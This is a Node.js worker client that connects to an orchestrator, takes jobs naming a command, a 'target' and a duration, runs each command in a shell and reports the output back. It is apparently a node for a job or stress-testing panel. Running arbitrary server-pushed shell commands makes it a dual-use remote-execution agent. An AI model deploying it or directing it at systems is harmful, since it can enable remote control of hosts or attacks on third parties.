const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const { spawn } = require('node:child_process');

const serverUrl = new URL(process.env.ORCHESTRATOR || 'http://127.0.0.1:3295');
const token = process.env.CLIENT_TOKEN || '';
const workerName = process.env.WORKER_NAME || os.hostname();
const version = '1.0.0';
const maxConcurrent = Math.max(1, Number(process.env.MAX_CONCURRENT) || 1);
const workdir = __dirname;
const reconnectDelayMs = 3_000;
const logLimit = 4000;

const workerId = `${workerName}-${process.pid}`;
const running = new Map();

let shuttingDown = false;
let controlSocket = null;
let signalRequest = null;
let reconnectTimer = null;
const pendingSignalMessages = [];

function log(...args) {
    console.log(`[${new Date().toISOString().slice(11, 19)}] ${args.join(' ')}`);
}

function authHeaders(extra = {}) {
    return token ? { 'x-worker-token': token, ...extra } : extra;
}

function request(method, pathname, body) {
    return new Promise((resolve, reject) => {
        const payload = body === undefined ? undefined : JSON.stringify(body);
        const req = http.request(
            {
                protocol: serverUrl.protocol,
                hostname: serverUrl.hostname,
                port: serverUrl.port || 80,
                method,
                path: pathname,
                headers: authHeaders({
                    ...(payload ? { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload) } : {}),
                }),
            },
            (res) => {
                const chunks = [];
                res.on('data', (chunk) => chunks.push(chunk));
                res.on('end', () => {
                    const text = Buffer.concat(chunks).toString('utf8');
                    let data = null;
                    try {
                        data = text ? JSON.parse(text) : null;
                    } catch {
                        data = { raw: text };
                    }
                    resolve({ status: res.statusCode, data });
                });
            },
        );

        req.on('error', reject);
        req.setTimeout(20_000, () => req.destroy(new Error('Request timeout')));
        if (payload) {
            req.write(payload);
        }
        req.end();
    });
}

function connectControl() {
    if (shuttingDown) {
        return;
    }

    const req = http.request({
        protocol: serverUrl.protocol,
        hostname: serverUrl.hostname,
        port: serverUrl.port || 80,
        method: 'GET',
        path: '/api/worker',
        headers: authHeaders({
            connection: 'Upgrade',
            upgrade: 'worker',
            'x-worker-id': workerId,
            'x-worker-name': workerName,
            'x-worker-version': version,
        }),
    });

    controlSocket = req;

    req.on('upgrade', (res, socket) => {
        log(`connected to ${serverUrl.origin} as ${workerId} (slots ${maxConcurrent})`);
        socket.setNoDelay(true);
        socket.setKeepAlive(true, 15_000);
        flushSignal();

        socket.write(`${JSON.stringify({ type: 'hello', name: workerName, version, slots: maxConcurrent })}\n`);

        let buffer = '';
        socket.on('data', (chunk) => {
            buffer += chunk.toString('utf8');
            let newline;
            while ((newline = buffer.indexOf('\n')) !== -1) {
                const line = buffer.slice(0, newline).trim();
                buffer = buffer.slice(newline + 1);
                if (!line) {
                    continue;
                }
                let message;
                try {
                    message = JSON.parse(line);
                } catch {
                    continue;
                }
                handleControlMessage(message);
            }
        });

        socket.on('error', () => {});
        socket.on('close', () => {
            log('control connection closed, reconnecting');
            controlSocket = null;
            scheduleReconnect();
        });
    });

    req.on('response', (res) => {
        const chunks = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
            log(`refused (${res.statusCode}): ${Buffer.concat(chunks).toString('utf8').trim()}`);
            scheduleReconnect();
        });
    });

    req.on('error', (error) => {
        log(`offline, ${error.message} (retry 3s)`);
        scheduleReconnect();
    });

    req.end();
}

function scheduleReconnect() {
    if (shuttingDown || reconnectTimer) {
        return;
    }

    reconnectTimer = setTimeout(() => {
        reconnectTimer = null;
        connectControl();
    }, reconnectDelayMs);
}

function handleControlMessage(message) {
    if (!message || typeof message !== 'object') {
        return;
    }

    if (message.type === 'job') {
        activeJobsSeen = 0;
        stopSignal();

        if (message.error) {
            log(`job error: ${message.error}`);
        }
        if (message.job) {
            runJob(message.job);
        }
        return;
    }
}

let activeJobsSeen = 0;

function runJob(job) {
    if (!job || typeof job.id !== 'string' || typeof job.command !== 'string') {
        return;
    }

    if (activeJobsSeen >= maxConcurrent) {
        log(`skip ${job.id.slice(0, 8)}: slots busy`);
        return;
    }

    activeJobsSeen += 1;
    log(`job ${job.id.slice(0, 8)}  ${job.name} ${job.target} ${job.time}s`);

    const startedAt = Date.now();
    const child = spawn(job.command, {
        cwd: workdir,
        shell: true,
        windowsHide: true,
        stdio: ['ignore', 'pipe', 'pipe'],
    });

    running.set(job.id, child);

    let output = '';
    const collect = (chunk) => {
        output = (output + chunk.toString('utf8')).slice(-logLimit);
    };
    child.stdout.on('data', collect);
    child.stderr.on('data', collect);

    const finish = (exitCode, note) => {
        running.delete(job.id);
        activeJobsSeen = Math.max(0, activeJobsSeen - 1);

        const text = note ? `${output}\n${note}`.slice(-logLimit) : output;
        log(`job ${job.id.slice(0, 8)}  exit=${exitCode} ${Date.now() - startedAt}ms`);
        sendSignal({ type: 'result', id: job.id, exitCode, output: text });
    };

    child.on('error', (error) => {
        finish(null, `Spawn failed: ${error.message}`);
    });

    child.on('close', (code) => {
        finish(Number.isInteger(code) ? code : 1, null);
    });
}

function sendSignal(message) {
    if (shuttingDown) {
        return;
    }

    if (signalRequest && !signalRequest.destroyed) {
        signalRequest.write(`${JSON.stringify(message)}\n`);
        return;
    }

    pendingSignalMessages.push(message);
}

function flushSignal() {
    if (!signalRequest || signalRequest.destroyed || pendingSignalMessages.length === 0) {
        return;
    }

    while (pendingSignalMessages.length > 0) {
        signalRequest.write(`${JSON.stringify(pendingSignalMessages.shift())}\n`);
    }
}

function startSignal() {
    if (shuttingDown || signalRequest) {
        return;
    }

    const payload = JSON.stringify({
        id: workerId,
        name: workerName,
        version,
        slots: maxConcurrent,
        running: [...running.keys()],
    });

    const req = http.request(
        {
            protocol: serverUrl.protocol,
            hostname: serverUrl.hostname,
            port: serverUrl.port || 80,
            method: 'POST',
            path: '/api/worker/signal',
            headers: authHeaders({
                'content-type': 'application/json',
                'content-length': Buffer.byteLength(payload),
            }),
        },
        (res) => {
            if (res.statusCode !== 200) {
                const chunks = [];
                res.on('data', (chunk) => chunks.push(chunk));
                res.on('end', () => {
                    log(`signal rejected (${res.statusCode}): ${Buffer.concat(chunks).toString('utf8').trim()}`);
                });
                res.on('error', () => {});
                signalRequest = null;
                return;
            }

            signalRequest = req;
            flushSignal();

            let buffer = '';
            res.setEncoding('utf8');
            res.on('data', (chunk) => {
                buffer += chunk;
                let newline;
                while ((newline = buffer.indexOf('\n')) !== -1) {
                    const line = buffer.slice(0, newline).trim();
                    buffer = buffer.slice(newline + 1);
                    if (!line) {
                        continue;
                    }
                    let message;
                    try {
                        message = JSON.parse(line);
                    } catch {
                        continue;
                    }
                    handleControlMessage(message);
                }
            });
            res.on('error', () => {});
            res.on('close', () => {
                if (signalRequest === req) {
                    signalRequest = null;
                }
            });
        },
    );

    req.on('error', (error) => {
        log(`signal channel down: ${error.message}`);
        if (signalRequest === req) {
            signalRequest = null;
        }
        setTimeout(startSignal, reconnectDelayMs).unref();
    });

    req.end(payload);

    // Dipakai hanya sebelum response 200 diterima; setelah itu signalRequest = req.
    signalRequest = req;
}

function stopSignal() {
    if (!signalRequest) {
        return;
    }

    const req = signalRequest;
    signalRequest = null;
    if (req !== controlSocket) {
        req.destroy();
    }
}

function shutdown() {
    if (shuttingDown) {
        return;
    }

    shuttingDown = true;
    if (reconnectTimer) {
        clearTimeout(reconnectTimer);
        reconnectTimer = null;
    }

    for (const child of running.values()) {
        child.kill('SIGTERM');
    }

    if (controlSocket) {
        controlSocket.destroy();
    }
    if (signalRequest) {
        signalRequest.destroy();
    }
}

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);

process.on('SIGHUP', () => {
    log('reload ignored: method.json is read by the orchestrator');
});

log(`worker ${workerId} -> ${serverUrl.origin}  (slots ${maxConcurrent}, dir ${workdir})`);
connectControl();
startSignal();